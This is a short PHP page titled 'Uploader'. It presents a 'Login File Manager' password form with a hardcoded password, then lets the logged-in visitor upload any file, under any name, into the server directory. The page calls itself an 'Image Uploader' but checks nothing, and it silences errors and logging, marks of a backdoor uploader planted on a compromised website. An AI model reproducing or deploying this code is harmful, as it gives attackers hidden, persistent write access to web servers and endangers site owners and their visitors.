<html>
<head>
<title>Uploader</title>
</head>
<body>
<?php
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);


$password = "4LF45T";

// Login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '<form method="post">
                <h2>Login File Manager</h2>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
              </form>';
        exit;
    }
}

echo "<b>Image Uploader</b><br>";
if($_POST){
    if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){
        echo "Berhasil";
    }else{
        echo "Gagal";
    }
}else{
    echo "<form method=post enctype=multipart/form-data>
    <input type=file name=0><input name=0 type=submit value=Upload File>";
}

?>
</body>
</html>
